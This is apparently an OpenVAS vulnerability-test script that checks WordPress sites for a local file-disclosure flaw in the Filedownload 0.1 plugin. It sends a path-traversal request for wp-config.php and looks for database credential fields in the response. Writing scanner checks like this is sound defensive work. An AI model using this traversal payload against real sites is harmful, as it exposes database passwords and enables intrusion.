###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_wordpress_49669.nasl 7015 2017-08-28 11:51:24Z teissa $
#
# WordPress Filedownload Local File Disclosure Vulnerability
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2011 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

tag_summary = "The Filedownload plug-in for WordPress is prone to a local file-
disclosure vulnerability because it fails to adequately validate user-
supplied input.

Exploiting this vulnerability could allow an attacker to obtain
potentially sensitive information from local files on computers
running the vulnerable application. This may aid in further attacks.

Filedownload 0.1 is vulnerable; other versions may also be affected.";


SCRIPT_OID  = "1.3.6.1.4.1.25623.1.0.103258";
CPE = "cpe:/a:wordpress:wordpress";

if (description)
{
 script_oid(SCRIPT_OID);
 script_version("$Revision: 7015 $");
 script_tag(name:"last_modification", value:"$Date: 2017-08-28 13:51:24 +0200 (Mon, 28 Aug 2017) $");
 script_tag(name:"creation_date", value:"2011-09-19 14:00:59 +0200 (Mon, 19 Sep 2011)");
 script_bugtraq_id(49669);
 script_tag(name:"cvss_base", value:"6.8");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:P/I:P/A:P");
 script_name("WordPress Filedownload Local File Disclosure Vulnerability");

 script_xref(name : "URL" , value : "http://www.securityfocus.com/bid/49669");
 script_xref(name : "URL" , value : "http://plugins.svn.wordpress.org/filedownload/trunk/filedownload.php");
 script_xref(name : "URL" , value : "http://wordpress.org/");

 script_tag(name:"qod_type", value:"remote_vul");
 script_category(ACT_ATTACK);
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2011 Greenbone Networks GmbH");
 script_dependencies("secpod_wordpress_detect_900182.nasl");
 script_require_ports("Services/www", 80);
 script_mandatory_keys("wordpress/installed");
 script_tag(name : "summary" , value : tag_summary);
 exit(0);
}

include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");
include("version_func.inc");
   
if(!port = get_app_port(cpe:CPE, nvt:SCRIPT_OID))exit(0);
if(!dir = get_app_location(cpe:CPE, nvt:SCRIPT_OID, port:port))exit(0);

url = string(dir,"/wp-content/plugins/filedownload/download.php/?path=../../../wp-config.php "); 

if(http_vuln_check(port:port, url:url,pattern:"DB_NAME",extra_check:make_list("DB_USER","DB_PASSWORD","DB_HOST"))) {
     
  security_message(port:port);
  exit(0);

}

exit(0);
